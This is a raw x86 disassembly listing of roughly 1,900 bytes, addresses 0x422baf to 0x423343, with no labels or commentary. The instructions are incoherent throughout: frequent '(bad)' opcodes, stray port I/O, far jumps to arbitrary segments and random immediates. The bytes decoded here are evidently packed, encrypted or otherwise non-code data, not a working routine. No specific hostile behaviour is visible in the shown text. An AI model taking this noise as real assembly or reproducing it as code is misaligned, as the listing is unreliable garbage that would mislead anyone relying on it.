  422baf:	jmp    0xcdaa1bf6
  422bb4:	in     eax,dx
  422bb5:	mov    esi,0x7d118707
  422bba:	mov    ?,esp
  422bbc:	pop    ds
  422bbd:	cmp    BYTE PTR [edi+eiz*4],bl
  422bc0:	(bad)  
  422bc1:	shl    BYTE PTR [ebp-0x51],0x9d
  422bc5:	test   BYTE PTR [eax-0x3c60bd24],cl
  422bcb:	add    ah,bh
  422bcd:	xlat   BYTE PTR ds:[ebx]
  422bce:	push   eax
  422bcf:	mov    WORD PTR [ecx+0x67],es
  422bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bd3:	test   al,0x11
  422bd5:	repnz rcr BYTE PTR [edi+eax*2],1
  422bd9:	(bad)  
  422bda:	rcl    edi,0x58
  422bdd:	mov    dh,0xf5
  422bdf:	add    DWORD PTR [ebx-0x27d48a2d],edx
  422be5:	and    ah,dl
  422be7:	or     esp,DWORD PTR gs:[ebp+eax*1-0x45]
  422bec:	icebp  
  422bed:	xchg   esp,eax
  422bee:	lea    esp,[ebx+0x273fad08]
  422bf4:	mov    eax,0xb1a85b3c
  422bf9:	cmp    bl,BYTE PTR [eax-0x254ef6]
  422bff:	es push edi
  422c01:	or     BYTE PTR [esi],dh
  422c03:	cmp    ah,al
  422c05:	lahf   
  422c06:	xor    ebx,DWORD PTR [edx-0x64166d26]
  422c0c:	mov    ?,WORD PTR gs:[eax-0x36189112]
  422c13:	nop
  422c14:	cmp    eax,DWORD PTR [eax+eiz*8]
  422c17:	ret    
  422c18:	shr    BYTE PTR ds:0x7ad6fc11,cl
  422c1e:	(bad)  
  422c1f:	push   esp
  422c20:	dec    eax
  422c21:	ret    
  422c22:	mov    ch,0x85
  422c24:	mov    dl,0xe7
  422c26:	xlat   BYTE PTR ds:[ebx]
  422c27:	mov    edx,0x46489a75
  422c2c:	daa    
  422c2d:	sbb    al,0x48
  422c2f:	inc    ebx
  422c30:	shl    edi,cl
  422c32:	mov    ebx,0xb13dd784
  422c37:	jmp    0x422bf7
  422c39:	adc    BYTE PTR [ebp+0x54],cl
  422c3c:	js     0x422ca9
  422c3e:	ret    
  422c3f:	cs mov bh,0x87
  422c42:	rcr    BYTE PTR [edx-0x5d],cl
  422c45:	mov    esi,DWORD PTR [eax+ebx*4]
  422c48:	sub    BYTE PTR [esi-0x2f],0x1d
  422c4c:	add    eax,0xbce69d3
  422c51:	ss mov ebx,0xfd5a846e
  422c57:	pop    eax
  422c58:	(bad)  
  422c59:	lock dec esp
  422c5b:	ret    0x18d7
  422c5e:	mov    BYTE PTR [edi+0x403d2fd1],bl
  422c64:	and    BYTE PTR [ecx],al
  422c66:	das    
  422c67:	in     al,dx
  422c68:	jo     0x422cd2
  422c6a:	test   ah,ah
  422c6c:	mov    bh,0x17
  422c6e:	xor    bh,BYTE PTR [edi+eiz*1-0x1e]
  422c72:	adc    al,0x96
  422c74:	pop    ebx
  422c75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c76:	jmp    0x9d82:0xe108b81d
  422c7d:	neg    bl
  422c7f:	cs xchg ebx,eax
  422c81:	xor    dh,bl
  422c83:	mov    ebx,0x19437303
  422c88:	cmp    DWORD PTR [eax],eax
  422c8a:	dec    esp
  422c8b:	cmc    
  422c8c:	and    edx,DWORD PTR [edx]
  422c8e:	push   ebx
  422c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c90:	addr16 add al,0x1a
  422c93:	mov    BYTE PTR [eax-0x1b36c5db],bh
  422c99:	mov    edx,DWORD PTR [ecx-0x3e316520]
  422c9f:	jge    0x422c96
  422ca1:	cmc    
  422ca2:	push   eax
  422ca3:	mov    dl,0x6d
  422ca5:	out    0x90,al
  422ca7:	retf   
  422ca8:	int3   
  422ca9:	adc    ebx,edi
  422cab:	pop    eax
  422cac:	dec    ebx
  422cad:	imul   esi,DWORD PTR [eax+0x2eaac4a8],0xffffff9d
  422cb4:	mov    edi,0x180b7032
  422cb9:	and    eax,0xbd1e520
  422cbe:	push   cs
  422cbf:	inc    ebp
  422cc0:	inc    ebx
  422cc1:	mov    ds:0x21f52136,eax
  422cc6:	mov    eax,ds:0x652b2514
  422ccb:	sbb    dl,BYTE PTR [eax-0x267bd339]
  422cd1:	jmp    0xd1eff43a
  422cd6:	xor    ch,BYTE PTR [ebp-0x57b65fad]
  422cdc:	adc    ebx,DWORD PTR ds:0x4c746b83
  422ce2:	imul   esi,DWORD PTR ds:0xbe2743c,0x123ee03
  422cec:	xchg   esp,eax
  422ced:	push   ebp
  422cee:	sub    edi,ecx
  422cf0:	ror    BYTE PTR [ebx],1
  422cf2:	stos   DWORD PTR es:[edi],eax
  422cf3:	push   ebp
  422cf4:	adc    al,0x74
  422cf6:	les    ebp,FWORD PTR [edx-0xf500fd9]
  422cfc:	lahf   
  422cfd:	and    ecx,DWORD PTR [eax]
  422cff:	imul   esp,DWORD PTR [ebx-0x4e],0x9fc0a6e8
  422d06:	mov    dh,0x92
  422d08:	les    esp,FWORD PTR [eax+ecx*1+0x1d]
  422d0c:	jecxz  0x422d7b
  422d0e:	js     0x422d18
  422d10:	fdivr  DWORD PTR [edx+0x110be985]
  422d16:	bound  esp,QWORD PTR gs:[eax]
  422d19:	retf   
  422d1a:	push   cs
  422d1b:	jb     0x422d2a
  422d1d:	imul   eax,ebp,0x74
  422d20:	pop    ds
  422d21:	fs (bad) 
  422d23:	push   ds
  422d24:	add    al,0x30
  422d26:	scas   al,BYTE PTR es:[edi]
  422d27:	mov    bh,BYTE PTR [ebp+ecx*2-0x44]
  422d2b:	mul    BYTE PTR ds:0x3748a319
  422d31:	pop    edx
  422d32:	xor    al,0x2d
  422d34:	sbb    al,0xcf
  422d36:	add    DWORD PTR [edi+0x52],esp
  422d39:	xchg   DWORD PTR [esi+edi*2+0x4a],ebx
  422d3d:	loope  0x422d51
  422d3f:	ret    0x55f7
  422d42:	adc    bh,BYTE PTR [eax-0x5f]
  422d45:	and    DWORD PTR [ebx],0xe3914a30
  422d4b:	fimul  DWORD PTR [eax-0x55]
  422d4e:	sti    
  422d4f:	retf   0xb850
  422d52:	inc    ebp
  422d53:	inc    ecx
  422d54:	and    al,0x49
  422d56:	out    dx,al
  422d57:	imul   ebx,esi,0x20
  422d5a:	sub    DWORD PTR [esi+0x6893fcd9],ebx
  422d60:	cmp    al,BYTE PTR [eax+edi*4-0x4603759]
  422d67:	mov    ch,0xdd
  422d69:	rcr    DWORD PTR [esi-0x31],1
  422d6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d6d:	aad    0xdb
  422d6f:	xor    al,0xf4
  422d71:	cmp    al,0x6b
  422d73:	clc    
  422d74:	adc    BYTE PTR [ebx+eax*1-0x4c77c17b],bl
  422d7b:	or     dl,ah
  422d7d:	gs pushf 
  422d7f:	dec    esi
  422d80:	add    al,0x3d
  422d82:	cs in  al,0xf0
  422d85:	xor    dl,al
  422d87:	jmp    0x6af:0xfe3be8c5
  422d8e:	ins    BYTE PTR es:[edi],dx
  422d8f:	add    eax,0xda4526fd
  422d94:	jp     0x422e03
  422d96:	adc    DWORD PTR [eax+0x7],ebx
  422d99:	dec    ebp
  422d9a:	pop    ebp
  422d9b:	dec    edi
  422d9c:	mov    cl,0x1c
  422d9e:	int3   
  422d9f:	mov    dl,0x77
  422da1:	call   0xc2ac:0x1f3a0d30
  422da8:	mov    dl,bh
  422daa:	xor    dl,BYTE PTR [ebx-0x15a2dd76]
  422db0:	push   0x7a
  422db2:	or     eax,0xe87ef825
  422db7:	(bad)  
  422db8:	lahf   
  422db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422dba:	mov    dl,0x2a
  422dbc:	adc    al,0xee
  422dbe:	sub    BYTE PTR [edx+ecx*1+0x47],ah
  422dc2:	push   dx
  422dc4:	(bad)  
  422dc5:	outs   dx,BYTE PTR ds:[esi]
  422dc6:	pop    edx
  422dc7:	les    edx,FWORD PTR [ebx+0x5b]
  422dca:	dec    eax
  422dcb:	lea    esp,[ebp+0x4a]
  422dce:	cdq    
  422dcf:	lods   eax,DWORD PTR ds:[esi]
  422dd0:	fld    TBYTE PTR [esi+ecx*4-0x5a]
  422dd4:	(bad)  
  422dd5:	adc    DWORD PTR [ebp-0x75],ecx
  422dd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422dd9:	pop    eax
  422dda:	or     eax,0x781aa9d7
  422ddf:	fsub   QWORD PTR [edi]
  422de1:	lds    edi,FWORD PTR [edi+0x25]
  422de4:	xor    BYTE PTR [edx+ecx*4],bl
  422de7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422de8:	or     BYTE PTR [ecx-0x59818a36],al
  422dee:	stos   DWORD PTR es:[edi],eax
  422def:	imul   BYTE PTR [ecx+0x77]
  422df2:	shl    BYTE PTR [eax-0x5e],1
  422df5:	stc    
  422df6:	mov    esi,edx
  422df8:	cmp    DWORD PTR [edx+edx*1-0x70427c24],edx
  422dff:	jl     0x422df8
  422e01:	ins    BYTE PTR es:[edi],dx
  422e02:	clc    
  422e03:	(bad)  [ebx-0x4a]
  422e06:	adc    BYTE PTR [ecx],0xcd
  422e09:	cmp    ax,0x5554
  422e0d:	and    eax,0xfa5c2d50
  422e12:	retf   
  422e13:	jge    0x422df6
  422e15:	(bad)  
  422e16:	jmp    0xf879337b
  422e1b:	pop    eax
  422e1c:	xchg   ch,dl
  422e1e:	pop    ebx
  422e1f:	retf   0x7e3
  422e22:	repnz push edi
  422e24:	mov    ch,0xd1
  422e26:	xor    DWORD PTR [edi],esi
  422e28:	fisttp DWORD PTR [eax-0x7033e4f8]
  422e2e:	mov    ds,WORD PTR [ebx]
  422e30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e31:	pop    ecx
  422e32:	imul   DWORD PTR [edx+0x65cc5d89]
  422e38:	arpl   WORD PTR [edx+eax*8+0x2a],dx
  422e3c:	jg     0x422eb5
  422e3e:	dec    eax
  422e3f:	jnp    0x422e39
  422e41:	inc    esi
  422e42:	mov    ecx,0x143bc708
  422e47:	mov    eax,0x73a5ccbf
  422e4c:	jbe    0x422e48
  422e4e:	pusha  
  422e4f:	sub    al,0x25
  422e51:	or     bh,cl
  422e53:	rcr    DWORD PTR [ecx-0x5eaaca13],0x34
  422e5a:	sahf   
  422e5b:	and    dl,dh
  422e5d:	nop    DWORD PTR [ecx+0xf550c34]
  422e64:	mov    ah,0x41
  422e66:	arpl   WORD PTR [eax-0x76],di
  422e69:	cmp    edx,DWORD PTR [eax+ebx*2]
  422e6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e6d:	jb     0x422e89
  422e6f:	pop    ds
  422e70:	ret    0x689f
  422e73:	imul   ebx,DWORD PTR [ecx-0x762d45f6],0xfffffff9
  422e7a:	pop    ds
  422e7b:	stos   BYTE PTR es:[edi],al
  422e7c:	jecxz  0x422e04
  422e7e:	add    eax,DWORD PTR [ebx-0x3f]
  422e81:	dec    ecx
  422e82:	add    edi,DWORD PTR [esi+eiz*2+0x6a]
  422e86:	stos   DWORD PTR es:[edi],eax
  422e87:	or     edx,DWORD PTR [edi+0xf]
  422e8a:	mov    ebx,0x1a7dd2ff
  422e8f:	sti    
  422e90:	(bad)  
  422e91:	and    BYTE PTR [edi+0x3d],al
  422e94:	lock push esi
  422e96:	enter  0x1c58,0x21
  422e9a:	cmp    eax,0xb01d1567
  422e9f:	sbb    ecx,DWORD PTR [eax-0xda8d008]
  422ea5:	arpl   sp,dx
  422ea7:	sbb    al,BYTE PTR es:[eax+ebp*2]
  422eab:	pop    ebp
  422eac:	push   esi
  422ead:	ret    
  422eae:	imul   DWORD PTR [edx-0x67cd0acd]
  422eb4:	dec    ebp
  422eb5:	repnz mov dh,0x9d
  422eb8:	test   al,0x37
  422eba:	iret   
  422ebb:	scas   al,BYTE PTR es:[edi]
  422ebc:	sbb    al,0xb3
  422ebe:	adc    ebx,edx
  422ec0:	lods   eax,DWORD PTR ds:[esi]
  422ec1:	mov    al,0x0
  422ec3:	jge    0x422ed4
  422ec5:	dec    eax
  422ec6:	repnz data16 mov ah,0xde
  422eca:	push   ebp
  422ecb:	(bad)
  422ece:	jb     0x422e6f
  422ed0:	out    0x66,al
  422ed2:	out    0x16,al
  422ed4:	fmul   QWORD PTR [ebx+0x5bb6ed2]
  422eda:	adc    al,0x2f
  422edc:	jmp    0xc0864b94
  422ee1:	inc    eax
  422ee2:	addr16 cli 
  422ee4:	addr16 mov dl,0x56
  422ee7:	add    BYTE PTR [esi+0x46],dh
  422eea:	sub    eax,0xe2887cdc
  422eef:	sub    BYTE PTR [edi-0x5b],dl
  422ef2:	dec    esi
  422ef3:	mov    bl,0xbe
  422ef5:	cli    
  422ef6:	mov    edx,0x95399eea
  422efb:	ret    
  422efc:	pop    esi
  422efd:	xchg   ebx,ecx
  422eff:	jg     0x422f3c
  422f01:	dec    eax
  422f02:	leave  
  422f03:	not    BYTE PTR [esi-0x23]
  422f06:	in     eax,dx
  422f07:	pop    ds
  422f08:	out    0x53,al
  422f0a:	aaa    
  422f0b:	mov    ecx,0x910c1d7a
  422f10:	add    eax,0x3b713f1c
  422f15:	push   esp
  422f16:	sub    ebp,ebp
  422f18:	mov    dh,0xea
  422f1a:	dec    ecx
  422f1b:	jmp    0xed010734
  422f20:	(bad)  
  422f21:	mov    cl,BYTE PTR [esi-0x345bea26]
  422f27:	aad    0x61
  422f29:	or     BYTE PTR [ebx-0x2c0fb585],dl
  422f2f:	call   0x8c4a:0xf45c3de4
  422f36:	aam    0xca
  422f38:	or     ch,BYTE PTR [edx+ebx*2-0x33]
  422f3c:	mov    al,0xd9
  422f3e:	call   0x95a:0x1b1946fc
  422f45:	mov    bh,0xf9
  422f47:	pushf  
  422f48:	jae    0x422fb7
  422f4a:	or     ebp,ebp
  422f4c:	bound  ecx,QWORD PTR [edi-0x5308abb4]
  422f52:	pop    ebp
  422f53:	mov    BYTE PTR [edi],dl
  422f55:	mov    ds:0x4540d517,eax
  422f5a:	aas    
  422f5b:	sbb    BYTE PTR [edi-0x6d2acf44],al
  422f61:	gs push ss
  422f63:	mov    esp,0x6e9513b6
  422f68:	js     0x422fc5
  422f6a:	fs xchg esp,eax
  422f6c:	int3   
  422f6d:	mov    ch,0x94
  422f6f:	xchg   esi,eax
  422f70:	mov    edx,0xa1b6c5c
  422f75:	sbb    BYTE PTR [ecx+0x47886294],cl
  422f7b:	pop    ecx
  422f7c:	xor    DWORD PTR [ebp-0x9537ab8],0xffffff93
  422f83:	dec    esi
  422f84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f85:	pusha  
  422f86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f87:	pop    ds
  422f88:	int    0x2c
  422f8a:	dec    edx
  422f8b:	inc    ebx
  422f8c:	inc    esp
  422f8d:	repnz xchg esi,eax
  422f8f:	shl    BYTE PTR [edi-0x1f],cl
  422f92:	and    DWORD PTR [edi-0x6c97f4c3],0x7f
  422f99:	dec    ebx
  422f9a:	(bad)  
  422f9b:	pop    ebp
  422f9c:	or     eax,0xcdf6ab2e
  422fa1:	stos   DWORD PTR es:[edi],eax
  422fa2:	imul   esi
  422fa4:	mov    ch,0x56
  422fa6:	ret    0xb62c
  422fa9:	dec    esp
  422faa:	cmp    eax,0x303c9fef
  422faf:	jl     0x422fbb
  422fb1:	xor    al,0x30
  422fb3:	add    DWORD PTR [eax],ebp
  422fb5:	test   BYTE PTR [ebx+ebp*2+0x799f7d27],0x8e
  422fbd:	leave  
  422fbe:	inc    eax
  422fbf:	lds    edi,FWORD PTR [edi+0x44]
  422fc2:	call   0x7478:0x80890895
  422fc9:	jmp    0x422f6a
  422fcb:	ret    0x38fa
  422fce:	mov    cl,0x38
  422fd0:	sbb    eax,0xfedb62cc
  422fd5:	and    DWORD PTR [esi+0x4d],edx
  422fd8:	push   ebp
  422fd9:	inc    edi
  422fda:	sub    eax,0x22d57a88
  422fdf:	add    BYTE PTR [eax],0x12
  422fe2:	scas   eax,DWORD PTR es:[edi]
  422fe3:	jmp    0x7c00dc5c
  422fe8:	inc    eax
  422fe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fea:	clc    
  422feb:	push   edx
  422fec:	shl    BYTE PTR [ebp+0x54],cl
  422fef:	sub    al,0xaa
  422ff1:	int3   
  422ff2:	push   ds
  422ff3:	adc    BYTE PTR [ecx+0xb14610f],ah
  422ff9:	fisub  WORD PTR [edi]
  422ffb:	addr16 (bad) 
  422ffd:	sti    
  422ffe:	dec    esi
  422fff:	add    al,0x78
  423001:	or     esi,edi
  423003:	cdq    
  423004:	ins    BYTE PTR es:[edi],dx
  423005:	mov    ds:0x4d90bb96,al
  42300a:	in     eax,dx
  42300b:	cs das 
  42300d:	fnsave ds:0xce4e7996
  423013:	imul   BYTE PTR gs:[edi]
  423016:	jp     0x42304f
  423018:	cli    
  423019:	sbb    DWORD PTR [ebp-0x33],edi
  42301c:	hlt    
  42301d:	mov    BYTE PTR [edx],cl
  42301f:	jae    0x42307d
  423021:	xor    al,0x6a
  423023:	iret   
  423024:	and    al,bl
  423026:	in     al,0x82
  423028:	bound  eax,QWORD PTR [ecx+0x171986bf]
  42302e:	mov    al,ds:0x4ed7e270
  423033:	sahf   
  423034:	stos   DWORD PTR es:[edi],eax
  423035:	cmp    ch,BYTE PTR [ecx+0x6ab69666]
  42303b:	stos   WORD PTR es:[edi],ax
  42303d:	push   esi
  42303e:	xlat   BYTE PTR ds:[ebx]
  42303f:	in     eax,dx
  423040:	mov    edx,0x5c81c601
  423045:	inc    ebp
  423046:	jb     0x42308f
  423048:	push   ecx
  423049:	lds    esp,FWORD PTR [esi]
  42304b:	ret    
  42304c:	xor    ch,BYTE PTR [esp+eax*8-0x4a]
  423050:	test   BYTE PTR cs:[ebx+0x1ca9c065],0xae
  423058:	push   esp
  423059:	xchg   edx,eax
  42305a:	das    
  42305b:	(bad)  
  42305c:	lea    edi,[eax]
  42305e:	and    eax,0xf67cc794
  423063:	js     0x42301e
  423065:	or     ebp,DWORD PTR [ecx-0x12]
  423068:	repnz rcl ah,cl
  42306b:	mov    eax,ds:0x45b08321
  423070:	addr16 mov bh,0xbf
  423073:	fnstcw WORD PTR [esi-0x78]
  423076:	and    bh,BYTE PTR [edx+0x7527d78b]
  42307c:	adc    DWORD PTR fs:[ecx],ebp
  42307f:	bound  eax,QWORD PTR [ebx]
  423081:	sti    
  423082:	dec    ebx
  423083:	call   0x9c29:0xe14d95eb
  42308a:	add    al,0x72
  42308c:	or     eax,0x29140905
  423091:	mov    bh,BYTE PTR [esi]
  423093:	pushf  
  423094:	in     al,0xf7
  423096:	pop    ss
  423097:	stos   BYTE PTR es:[edi],al
  423098:	addr16 popf 
  42309a:	pop    eax
  42309b:	push   es
  42309c:	gs dec ebx
  42309e:	sub    dl,dh
  4230a0:	stos   BYTE PTR es:[edi],al
  4230a1:	inc    esp
  4230a2:	adc    ecx,DWORD PTR [edi]
  4230a4:	cmc    
  4230a5:	mov    bl,0x59
  4230a7:	dec    eax
  4230a8:	xor    DWORD PTR [edi+0x7d],ebp
  4230ab:	mov    ecx,0x1dce266c
  4230b0:	dec    ax
  4230b2:	add    al,0xda
  4230b4:	aad    0x75
  4230b6:	add    eax,0xd5fad879
  4230bb:	push   edx
  4230bc:	inc    ecx
  4230bd:	scas   al,BYTE PTR es:[edi]
  4230be:	add    al,0xc7
  4230c0:	popf   
  4230c1:	push   es
  4230c2:	mov    eax,0xdd56cd16
  4230c7:	mov    bl,0x2a
  4230c9:	test   al,0x64
  4230cb:	pop    edx
  4230cc:	enter  0x2f17,0x5a
  4230d0:	rcl    BYTE PTR [esi+ebp*4+0x60b4c1d7],0x92
  4230d8:	out    dx,al
  4230d9:	push   ecx
  4230da:	repz jmp 0xdf3:0xcdab5f3c
  4230e2:	adc    ebx,DWORD PTR [eax]
  4230e4:	add    al,0xd5
  4230e6:	imul   ebp,esp,0xd9fb5aa1
  4230ec:	pusha  
  4230ed:	push   ebx
  4230ee:	sbb    BYTE PTR ds:[esp+eiz*2-0x3],0x25
  4230f4:	sbb    BYTE PTR [eax+0xea8b9d2],dl
  4230fa:	ret    
  4230fb:	stos   BYTE PTR es:[edi],al
  4230fc:	cwde   
  4230fd:	inc    esi
  4230fe:	xor    DWORD PTR [edx],esp
  423100:	scas   eax,DWORD PTR es:[edi]
  423101:	mov    al,ds:0xc8a8e878
  423106:	mov    esp,0x48b80522
  42310b:	push   ebp
  42310c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42310d:	loope  0x423117
  42310f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423110:	pop    edx
  423111:	daa    
  423112:	xlat   BYTE PTR ds:[ebx]
  423113:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  423115:	jg     0x42311a
  423117:	inc    ecx
  423118:	repz ds xor dh,ch
  42311c:	push   esp
  42311d:	lods   eax,DWORD PTR ds:[esi]
  42311e:	and    BYTE PTR [ecx+0x237bc61f],cl
  423124:	add    BYTE PTR [esi+0xf],bh
  423127:	jae    0x4230b5
  423129:	adc    al,0x87
  42312b:	push   0x22
  42312d:	imul   ecx,DWORD PTR [ecx+0x5a4b72b8],0x4ac15d43
  423137:	sub    al,0x45
  423139:	adc    DWORD PTR [ebp+0x30f997e2],esp
  42313f:	xlat   BYTE PTR ds:[ebx]
  423140:	pop    edx
  423141:	shr    BYTE PTR [edx+eiz*4-0x13],1
  423145:	push   esp
  423146:	mov    esp,0x5bfab8e1
  42314b:	push   edx
  42314c:	and    ebx,edx
  42314e:	and    BYTE PTR [ecx+edi*1+0x6efda3b4],cl
  423155:	mov    bl,0x7d
  423157:	inc    eax
  423158:	inc    ebp
  423159:	pop    ss
  42315a:	hlt    
  42315b:	outs   dx,BYTE PTR ds:[esi]
  42315c:	stos   BYTE PTR es:[edi],al
  42315d:	sbb    DWORD PTR [eax+0x3a5da921],edi
  423163:	mov    esi,0xf4c2a069
  423168:	pop    ebx
  423169:	nop
  42316a:	outs   dx,BYTE PTR ds:[esi]
  42316b:	xchg   edi,eax
  42316c:	stos   BYTE PTR es:[edi],al
  42316d:	in     al,dx
  42316e:	sub    esp,ecx
  423170:	add    al,0x3e
  423172:	mov    ebx,0x20668f9d
  423177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423178:	in     eax,0x1e
  42317a:	push   ebp
  42317b:	xor    eax,0x3a40fe75
  423180:	add    al,0x65
  423182:	add    eax,0x5dda4a04
  423187:	repnz arpl WORD PTR [edi+esi*8+0x4533e5b5],ax
  42318f:	or     eax,DWORD PTR [eax]
  423191:	ret    0xac1a
  423194:	sub    DWORD PTR [esi-0x196380e1],0x60916cfb
  42319e:	sbb    eax,0x4f2ff4ea
  4231a3:	rcl    DWORD PTR [eax],1
  4231a5:	fcom   st(5)
  4231a7:	and    DWORD PTR [ebp-0x55],edx
  4231aa:	xchg   ebx,eax
  4231ab:	int3   
  4231ac:	dec    esi
  4231ad:	fwait
  4231ae:	xchg   ecx,eax
  4231af:	jmp    0x42322e
  4231b1:	cmp    ebx,esp
  4231b3:	inc    edx
  4231b4:	pop    edi
  4231b5:	and    ah,0x1f
  4231b8:	push   ss
  4231b9:	cdq    
  4231ba:	lahf   
  4231bb:	aas    
  4231bc:	cmp    esi,edx
  4231be:	sbb    edx,DWORD PTR [ecx+0x609213b]
  4231c4:	mov    bh,0x31
  4231c6:	add    ah,BYTE PTR [ecx-0x13fc69c1]
  4231cc:	scas   al,BYTE PTR es:[edi]
  4231cd:	in     al,0xa0
  4231cf:	(bad)  
  4231d0:	pop    ebp
  4231d1:	mov    edx,DWORD PTR [ebp+0x74]
  4231d4:	mov    esp,0xf496b23
  4231d9:	shr    BYTE PTR [ebp+0x39],0x1d
  4231dd:	add    BYTE PTR [eax+0x53],ah
  4231e0:	fbld   TBYTE PTR [ebp-0x13]
  4231e3:	pop    ss
  4231e4:	adc    eax,0x74054b3c
  4231e9:	pop    ebx
  4231ea:	inc    ebx
  4231eb:	out    dx,eax
  4231ec:	out    dx,eax
  4231ed:	jmp    0x423240
  4231ef:	xchg   ebx,eax
  4231f0:	aam    0x7
  4231f2:	xchg   edi,eax
  4231f3:	cmc    
  4231f4:	jmp    0x423258
  4231f6:	xchg   ebp,eax
  4231f7:	xchg   ebp,eax
  4231f8:	mov    ah,0xe5
  4231fa:	sti    
  4231fb:	out    dx,eax
  4231fc:	cld    
  4231fd:	(bad)  
  4231fe:	jbe    0x4231b6
  423200:	xchg   edx,eax
  423201:	lods   eax,DWORD PTR ds:[esi]
  423202:	and    eax,0x253765ff
  423207:	mov    edx,0x2c0e4b97
  42320c:	out    dx,al
  42320d:	dec    esp
  42320e:	mov    ch,0x88
  423210:	xlat   BYTE PTR ds:[ebx]
  423211:	push   0x69
  423213:	sbb    al,0xd1
  423215:	adc    dl,cl
  423217:	lods   al,BYTE PTR ds:[esi]
  423218:	xlat   BYTE PTR ds:[ebx]
  423219:	sub    eax,0xb34d318b
  42321e:	jecxz  0x42321f
  423220:	outs   dx,DWORD PTR ds:[esi]
  423221:	pop    esp
  423222:	jl     0x42320f
  423224:	mov    BYTE PTR [ebx+esi*2-0x7a],0xde
  423229:	in     eax,0xf7
  42322b:	mov    bl,BYTE PTR [esi+ebp*8]
  42322e:	out    dx,al
  42322f:	xchg   ecx,eax
  423230:	or     BYTE PTR ds:0x92205b5c,al
  423236:	xchg   DWORD PTR [edi],edi
  423238:	imul   esi,DWORD PTR [ebx],0x6f
  42323b:	inc    ebp
  42323c:	add    ebp,ebx
  42323e:	xchg   edx,eax
  42323f:	dec    ecx
  423240:	sbb    DWORD PTR [eax-0x6e],ebp
  423243:	sub    esi,DWORD PTR [edi+edi*8]
  423246:	into   
  423247:	call   0xd8ce:0x58724666
  42324e:	imul   edi,DWORD PTR [ecx],0x1f
  423251:	push   edx
  423252:	xchg   esi,eax
  423253:	out    dx,eax
  423254:	sub    al,0x86
  423256:	test   eax,0xe822fcd0
  42325b:	mov    esi,0xbc2fd720
  423260:	mov    bl,0x85
  423262:	pushf  
  423263:	add    DWORD PTR [ebx+0x74],esi
  423266:	dec    edx
  423267:	ins    DWORD PTR es:[edi],dx
  423268:	adc    al,BYTE PTR [edx]
  42326a:	mov    eax,ds:0x2e9a20f1
  42326f:	adc    DWORD PTR [eax+ebp*1],ebp
  423272:	(bad)  
  423273:	cmp    al,al
  423275:	mov    edx,0x5f3aea94
  42327a:	mov    esi,ebx
  42327c:	xchg   ecx,eax
  42327d:	inc    eax
  42327e:	bound  edi,QWORD PTR [edi]
  423280:	xchg   edi,eax
  423281:	daa    
  423282:	jle    0x42322e
  423284:	jg     0x42327c
  423286:	int3   
  423287:	loopne 0x423228
  423289:	inc    eax
  42328a:	mov    edi,0x1083b5e1
  42328f:	ins    BYTE PTR es:[edi],dx
  423290:	cmp    edi,DWORD PTR [edx]
  423292:	pop    ecx
  423293:	adc    eax,0x9749e392
  423298:	and    al,0x17
  42329a:	xor    eax,0xeae83c09
  42329f:	dec    ebp
  4232a0:	in     al,dx
  4232a1:	cmp    eax,0xeaa6fec
  4232a6:	ja     0x423229
  4232a8:	cmp    ecx,ecx
  4232aa:	xchg   ebx,eax
  4232ab:	and    DWORD PTR [esi],0x3b
  4232ae:	scas   al,BYTE PTR es:[edi]
  4232af:	jno    0x423322
  4232b1:	int3   
  4232b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232b3:	dec    ebp
  4232b4:	shl    BYTE PTR [ebp+ecx*1+0x5321233c],1
  4232bb:	hlt    
  4232bc:	addr16 sahf 
  4232be:	xor    DWORD PTR [esi],0xffffff9a
  4232c1:	xchg   esp,eax
  4232c2:	xchg   DWORD PTR [esi-0x11],edx
  4232c5:	pop    edi
  4232c6:	push   esp
  4232c7:	sti    
  4232c8:	cmp    ebx,ebp
  4232ca:	test   edx,edi
  4232cc:	out    dx,al
  4232cd:	push   edi
  4232ce:	sub    eax,0xb2298e8c
  4232d3:	loopne 0x4232b5
  4232d5:	mov    ecx,DWORD PTR ds:0x719e684a
  4232db:	sar    eax,cl
  4232dd:	and    BYTE PTR [edx+esi*1],0xa1
  4232e1:	je     0x4232e5
  4232e3:	bound  esp,QWORD PTR [eax-0x1f]
  4232e6:	in     eax,0xab
  4232e8:	pop    ebp
  4232e9:	and    ch,dh
  4232eb:	lods   al,BYTE PTR ds:[esi]
  4232ec:	cmp    eax,0x565eeaa2
  4232f1:	or     eax,0xe40600e9
  4232f6:	adc    eax,0x91a2dc8a
  4232fb:	cmp    al,0xd0
  4232fd:	mov    ecx,0xd4a9954a
  423302:	jecxz  0x42336b
  423304:	jae    0x4232f7
  423306:	pop    ss
  423307:	xchg   ebp,eax
  423308:	dec    eax
  423309:	xchg   dl,bh
  42330b:	sub    eax,0xa74df1ea
  423310:	push   es
  423311:	mov    ah,0x4f
  423313:	dec    esp
  423314:	sbb    eax,0x951744bf
  423319:	aam    0x61
  42331b:	cdq    
  42331c:	cmp    edi,DWORD PTR [esi]
  42331e:	add    BYTE PTR [edx-0x3a8c395e],0xba
  423325:	ja     0x4232ed
  423327:	inc    eax
  423328:	outs   dx,DWORD PTR ds:[esi]
  423329:	jl     0x4232f2
  42332b:	inc    edi
  42332c:	imul   edi,ebp,0x958527b
  423332:	inc    edx
  423333:	sbb    al,0x3
  423335:	and    esp,DWORD PTR [edx]
  423337:	fmul   st(0),st
  423339:	cdq    
  42333a:	jge    0x4233ac
  42333c:	mov    bl,0xf
  42333e:	int    0x23
  423340:	std    
  423341:	and    al,0xbd
  423343:	sub    BYTE PTR [ebx+ebp*2+0x1b],cl
